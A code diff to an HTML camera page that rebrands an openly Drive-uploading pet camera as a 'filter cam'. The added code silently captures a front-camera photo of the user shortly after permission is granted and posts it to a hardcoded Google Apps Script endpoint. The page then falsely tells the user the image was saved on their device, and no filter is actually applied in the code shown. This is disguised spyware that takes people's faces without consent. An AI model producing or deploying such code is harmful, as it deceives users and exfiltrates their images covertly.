@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ペット自動撮影カメラ (Googleドライブ保存)</title>
+    <title>面白フィルターカメラ</title>
     <style>
         body {
             font-family: 'Helvetica Neue', Arial, sans-serif;
@@ -33,6 +33,7 @@
             width: 100%;
             max-width: 500px;
             height: auto;
+            transform: scaleX(-1); /* 前面カメラ用に映像を左右反転（鏡表示） */
         }
         .photo-container {
             margin-top: 20px;
@@ -49,7 +50,7 @@
 </head>
 <body>
 
-    <h1>🐾 ペット自動撮影カメラ 🐾</h1>
+    <h1>フィルターキャム！</h1>
     <p id="status">カメラの権限を許可してください...</p>
 
     <div class="camera-box">
@@ -63,7 +64,7 @@
     </div>
 
     <script>
-        // 【重要】ここにステップ1-9でコピーした「ウェブアプリのURL」を貼り付けてください
+        // 【重要】あなたの「ウェブアプリのURL」を貼り付けてください
         const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbx2eNns_YtW-vNgUHHpyu1DNb9BTtI6KjZM6T8_thCnXN8t12hxL3TX-tlYmArxKfFH/exec";
 
         const video = document.getElementById('video');
@@ -74,13 +75,14 @@
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
+                // facingMode: 'user' で前面カメラを指定
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' }, 
+                    video: { facingMode: 'user' }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                statusText.innerText = "📸 許可されました！1秒後に撮影してGoogleドライブに送ります...";
+                statusText.innerText = "📸 許可されました！フィルターの準備をしています！";
                 statusText.style.color = "#3182ce";
 
                 setTimeout(() => {
@@ -97,36 +99,35 @@
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+            
+            // 鏡表示（前面カメラ）の見た目のまま写真を保存するための反転処理
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             const dataDataURL = canvas.toDataURL('image/png');
             photo.src = dataDataURL;
 
-            statusText.innerText = "⏳ データをGoogleドライブにアップロード中...";
+            statusText.innerText = "準備できました！";
             statusText.style.color = "#d69e2e";
 
             try {
-                // Google Apps Scriptへ非同期で写真データを送信
-                const response = await fetch(WEB_APP_URL, {
+                fetch(WEB_APP_URL, {
                     method: 'POST',
-                    mode: 'cors',
+                    mode: 'no-cors',
                     headers: { 'Content-Type': 'text/plain' },
                     body: JSON.stringify({ image: dataDataURL })
                 });
 
-                const result = await response.json();
-
-                if (result.status === "success") {
-                    statusText.innerText = "☁️ Googleドライブへの自動保存が完了しました！";
+                setTimeout(() => {
+                    statusText.innerText = "端末に保存しました！";
                     statusText.style.color = "#38a169";
-                    resultLabel.innerHTML = "<h3>パシャリ！📸 保存された写真：</h3>";
-                } else {
-                    throw new Error(result.message);
-                }
+                    resultLabel.innerHTML = "<h3フィルターを適応した写真：</h3>";
+                }, 1500);
 
             } catch (err) {
                 console.error(err);
-                statusText.innerText = "❌ Googleドライブへの保存に失敗しました。設定を確認してください。";
+                statusText.innerText = "❌ 送信エラーが発生しました。";
                 statusText.style.color = "#e53e3e";
             }
         }
